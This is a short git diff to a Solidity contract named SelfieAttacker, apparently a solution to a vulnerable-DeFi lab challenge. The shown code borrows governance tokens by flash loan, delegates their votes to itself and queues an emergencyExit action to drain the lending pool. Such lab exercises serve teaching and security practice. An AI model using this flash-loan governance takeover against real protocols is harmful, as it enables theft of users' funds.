@@ -5,6 +5,7 @@ import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156
 import {ISimpleGovernance} from "../../src/selfie/ISimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {Address} from "../../lib/openzeppelin-contracts/contracts/utils/Address.sol";
 
 contract SelfieAttacker is IERC3156FlashBorrower{
     ISimpleGovernance private governance;
@@ -34,7 +35,7 @@ contract SelfieAttacker is IERC3156FlashBorrower{
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32){
-        token.call(abi.encodeWithSignature("delegate(address)", address(this)));
+        Address.functionCall(token,abi.encodeWithSignature("delegate(address)", address(this)));
         actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", recovery));
 
         IERC20(token).approve(address (pool), amount);
